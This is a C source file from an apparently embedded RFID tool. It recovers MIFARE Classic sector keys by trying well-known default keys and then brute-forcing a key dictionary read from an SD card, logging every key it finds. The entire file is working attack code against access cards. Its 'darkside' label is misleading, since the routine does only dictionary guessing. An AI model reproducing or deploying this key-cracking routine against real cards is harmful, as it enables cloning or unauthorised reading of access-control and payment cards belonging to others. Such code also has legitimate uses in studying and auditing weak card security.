#include "attacks/darkside_attack.h"
#include "hal/card_comm.h"
#include "core/key_store.h"
#include "output/serial_reporter.h"
#include "config.h"
#include <SD.h>
#include <stdlib.h>

void darksideAttack_runSector(CardDump* d, uint8_t sector) {
    // Best-effort slow brute force using SD dictionary + builtin keys, with progress reporting.
    reporter_attackStart("darkside", sector, "A/B");
    // combine builtin
    const uint8_t builtin[][6] = {
        {0xFF,0xFF,0xFF,0xFF,0xFF,0xFF},
        {0xA0,0xA1,0xA2,0xA3,0xA4,0xA5},
        {0xD3,0xF7,0xD3,0xF7,0xD3,0xF7}
    };
    for (int i=0;i< (int)(sizeof(builtin)/6); i++) {
        RC522Status st = picc_mfAuth(MF_AUTH_KEY_A, ks_sectorToTrailer(sector), builtin[i], &d->uid);
        if (st==RC522_OK) {
            uint8_t buf[16]; if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) {
                ks_setKeyA(d, sector, builtin[i]); reporter_keyFound(sector, "A", builtin[i], "darkside-builtin"); picc_mfDeauth(); return;
            }
            picc_mfDeauth();
        }
        st = picc_mfAuth(MF_AUTH_KEY_B, ks_sectorToTrailer(sector), builtin[i], &d->uid);
        if (st==RC522_OK) { uint8_t buf[16]; if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) { ks_setKeyB(d, sector, builtin[i]); reporter_keyFound(sector, "B", builtin[i], "darkside-builtin"); picc_mfDeauth(); return; } picc_mfDeauth(); }
    }

    if (SD.begin(SD_CS_PIN)) {
        File f = SD.open(DICT_PATH);
        if (f) {
            size_t total=0; while (f.available()) { f.readStringUntil('\n'); total++; }
            f.seek(0);
            size_t tried=0;
            while (f.available()) {
                String line = f.readStringUntil('\n'); line.trim();
                if (line.length()!=12) continue;
                uint8_t key[6]; for (int i=0;i<6;i++) key[i] = (uint8_t) strtoul(line.substring(i*2, i*2+2).c_str(), NULL, 16);
                reporter_error("DARKSIDE_PROGRESS", String("tried ") + String(tried) + "/" + String(total)).c_str();
                RC522Status st = picc_mfAuth(MF_AUTH_KEY_A, ks_sectorToTrailer(sector), key, &d->uid);
                if (st==RC522_OK) { uint8_t buf[16]; if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) { ks_setKeyA(d, sector, key); reporter_keyFound(sector, "A", key, "darkside-dict"); picc_mfDeauth(); f.close(); return; } picc_mfDeauth(); }
                st = picc_mfAuth(MF_AUTH_KEY_B, ks_sectorToTrailer(sector), key, &d->uid);
                if (st==RC522_OK) { uint8_t buf[16]; if (picc_mfRead(ks_sectorToFirstBlock(sector), buf)==RC522_OK) { ks_setKeyB(d, sector, key); reporter_keyFound(sector, "B", key, "darkside-dict"); picc_mfDeauth(); f.close(); return; } picc_mfDeauth(); }
                tried++;
                if (tried % 50 == 0) delay(10);
            }
            f.close();
        }
    }

    reporter_error("DARKSIDE_FAIL", "Darkside/bruteforce completed with no result (try a larger dictionary)");
}
